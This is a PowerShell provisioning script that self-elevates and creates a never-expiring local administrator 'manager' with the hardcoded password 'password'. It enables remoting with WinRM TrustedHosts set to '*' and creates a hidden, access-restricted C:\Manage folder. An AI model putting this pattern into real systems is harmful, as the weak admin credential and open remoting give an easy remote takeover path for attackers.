if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$UserName = "manager"
$Password = "password"
$ManagePath = "C:\Manage"

if (!(Get-LocalUser -Name $UserName -ErrorAction SilentlyContinue)) {
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    New-LocalUser -Name $UserName -Password $SecurePassword -Description "manager administrator" -PasswordNeverExpires $true | Out-Null
    
    Add-LocalGroupMember -Group "Administrators" -Member $UserName
} else {
    Write-Host " already $UserName account exists" -ForegroundColor Gray
}

Set-ExecutionPolicy RemoteSigned -Force
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
Restart-Service WinRM


if (!(Test-Path $ManagePath)) { New-Item -ItemType Directory -Path $ManagePath | Out-Null }

$Acl = Get-Acl $ManagePath
$Acl.SetAccessRuleProtection($true, $false)

$ManagerAccount = New-Object System.Security.Principal.NTAccount($UserName)
$AdminGroup = New-Object System.Security.Principal.NTAccount("Builtin\Administrators")
$SystemGroup = New-Object System.Security.Principal.NTAccount("SYSTEM")

$FullControl = "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow"
$ManagerRule = New-Object System.Security.Principal.FileSystemAccessRule($ManagerAccount, $FullControl)
$AdminRule = New-Object System.Security.Principal.FileSystemAccessRule($AdminGroup, $FullControl)
$SystemRule = New-Object System.Security.Principal.FileSystemAccessRule($SystemGroup, $FullControl)

$Acl.SetAccessRule($ManagerRule)
$Acl.SetAccessRule($AdminRule)
$Acl.SetAccessRule($SystemRule)

Set-Acl $ManagePath $Acl
(Get-Item $ManagePath).Attributes = 'Directory', 'Hidden'

Pause
